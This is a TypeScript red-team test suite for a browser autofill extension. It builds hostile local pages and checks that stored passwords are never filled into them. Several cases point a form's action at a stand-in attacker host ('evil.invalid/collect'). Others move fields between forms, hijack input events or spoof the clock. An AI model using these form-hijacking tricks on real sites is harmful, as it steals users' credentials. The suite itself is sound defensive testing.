/** Hostile synthetic pages; actual unpacked-extension scripting and coordinator. */
import assert from 'node:assert/strict';
export async function redteamCases({target,popup,targetId,invoke,check}:any) {
  const origin='http://localhost:18258';
  const reset=()=>target.goto(origin+'/');
  const one=async(entity:string)=>{ const result=await invoke('scan');assert(result.ok);const field=result.value.fields.find((f:any)=>f.entity===entity);assert(field);return {scan:result.value.scan,selected:[{id:field.id,entity}],entities:{[entity]:'Synthetic-redteam-only#42'},secrets:true}; };
  await reset();let request=await one('password');
  await target.locator('#form').evaluate((form:HTMLFormElement)=>form.action='https://evil.invalid/collect');
  let result=await invoke('fill',request);
  check('red team: changed form action invalidates preview before any secret write',!result.ok && await target.locator('#password').inputValue()==='');

  await reset();request=await one('password');
  await target.evaluate(()=>{const form=document.createElement('form');form.id='other';document.body.append(form);form.append(document.querySelector('#password')!);});
  result=await invoke('fill',request);
  check('red team: moving an unchanged field into another form invalidates preview',!result.ok && await target.locator('#password').inputValue()==='');

  for(const override of [false,true]) {
    await reset();await target.evaluate(override=>{
      if(override) document.body.insertAdjacentHTML('beforeend','<button form="form" formaction="https://evil.invalid/collect">Alternate submit</button>');
      else document.querySelector('form')!.setAttribute('action','https://evil.invalid/collect');
    },override);
    request=await one('password');result=await invoke('fill',request);
    check(`red team: ${override?'external submit override':'cross-origin submission'} cannot receive secrets`,result.ok && result.value.count===0 && await target.locator('#password').inputValue()==='');
  }

  await reset();request=await one('firstName');await target.locator('#firstName').evaluate((el:HTMLInputElement)=>el.maxLength=2);
  result=await invoke('fill',request);check('red team: changed field length invalidates the inspected target',!result.ok && await target.locator('#firstName').inputValue()==='');

  await reset();let scan=await invoke('scan');
  const names=scan.value.fields.filter((f:any)=>['firstName','lastName'].includes(f.entity)).map((f:any)=>({id:f.id,entity:f.entity}));assert.equal(names.length,2);
  await target.evaluate(()=>document.querySelector('#firstName')!.addEventListener('input',()=>{(document.querySelector('#lastName') as HTMLInputElement).value='Changed during fill';},{once:true}));
  result=await invoke('fill',{scan:scan.value.scan,selected:names,entities:{firstName:'Alex',lastName:'Muster'}});
  check('red team: a page listener cannot make a later field overwrite a fresh value',result.ok && result.value.count===1 && await target.locator('#lastName').inputValue()==='Changed during fill');

  await reset();scan=await invoke('scan');
  const pair=scan.value.fields.filter((f:any)=>['username','password'].includes(f.entity)).map((f:any)=>({id:f.id,entity:f.entity}));
  await target.evaluate(()=>document.querySelector('#username')!.addEventListener('input',()=>document.querySelector('form')!.setAttribute('action','https://evil.invalid/collect'),{once:true}));
  result=await invoke('fill',{scan:scan.value.scan,selected:pair,entities:{username:'Synthetic',password:'Synthetic-only'},secrets:true});
  check('red team: action mutation during an earlier input event stops password delivery',result.ok && result.value.count===1 && await target.locator('#password').inputValue()==='');

  await reset();request=await one('firstName');
  const shift=async(enable:boolean)=>popup.evaluate(async({targetId,enable})=>{await(globalThis as any).chrome.scripting.executeScript({target:{tabId:targetId,frameIds:[0]},world:'ISOLATED',func:(enable:boolean)=>{
    const state=globalThis as any;
    if(enable){state.__redteamNow=Date.now;Date.now=()=>state.__redteamNow()+120001;}
    else{Date.now=state.__redteamNow;delete state.__redteamNow;}
  },args:[enable]});},{targetId,enable});
  try {await shift(true);result=await invoke('fill',request);} finally {await shift(false);}
  check('red team: scan expires after two minutes even if popup remains active',!result.ok && await target.locator('#firstName').inputValue()==='');

  await reset();result=await invoke('scan',{anchor:'00000000-0000-4000-8000-000000000000'});
  check('red team: missing or expired inline anchor never falls back to another form',!result.ok);
  request=await one('firstName');result=await invoke('fill',request);assert(result.ok);
  result=await invoke('fill',{...request,overwrite:true});check('red team: consumed scan cannot be replayed',!result.ok);
  await reset();
}
